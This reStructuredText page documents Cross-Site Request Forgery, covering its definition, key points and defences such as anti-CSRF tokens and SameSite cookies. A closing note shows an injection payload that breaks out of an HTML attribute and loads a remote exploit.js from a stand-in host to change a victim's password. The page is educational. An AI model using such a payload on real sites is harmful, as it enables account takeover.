=================================
Cross-Site Request Forgery (CSRF)
=================================

.. index::
   single: Cross-Site Request Forgery (CSRF)
   single: Web Applications - Technics; Cross-Site Request Forgery (CSRF)

.. contents::
    :depth: 3
    :backlinks: top

####

    .. note:: 
        
        **Liens Web**

        * `Cross-Site Request Forgery Prevention Cheat Sheet`_
        
.. _`Cross-Site Request Forgery Prevention Cheat Sheet`: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

-----------
Description
-----------

**Cross-Site Request Forgery (CSRF)** is a web security vulnerability that allows an attacker to
induce users to perform actions that they do not intend to perform. It occurs when a malicious
website, email, chat, or program causes a user's web browser to perform an unwanted action on a
trusted site where the user is currently authenticated.

It is a front end vulnerability.

Key points about CSRF:

    * Exploits the trust that a site has in a user's browser

    * Tricks the victim into submitting a malicious request

    * Inherits the identity and privileges of the victim to perform an undesired function on the
      victim's behalf

    * Generally targets state-changing requests, not theft of data

    * Can result in transferred funds, changed passwords, or data theft

CSRF attacks are possible because web browsers automatically include session cookies and other
authentication information with every request to a website, regardless of the origin of the request.

Prevention methods include:

    * Using anti-CSRF tokens
    * Checking the Referer header
    * Using SameSite cookie attribute
    * Implementing custom request headers

Understanding and mitigating CSRF vulnerabilities is crucial for maintaining the security and
integrity of web applications.

    .. note:: 
        
        instead of using JavaScript code that would return the session cookie **(xss)**, we would
        load a remote .js (JavaScript) file.

        A common CSRF attack to gain higher privileged access to a web application is to craft a
        JavaScript payload that automatically changes the victim's password to the value set by the
        attacker.
        
        .. code:: html
            :number-lines:
            :force:

             "><script src=//www.example.com/exploit.js></script>


####


####

--------
Weblinks
--------

.. target-notes::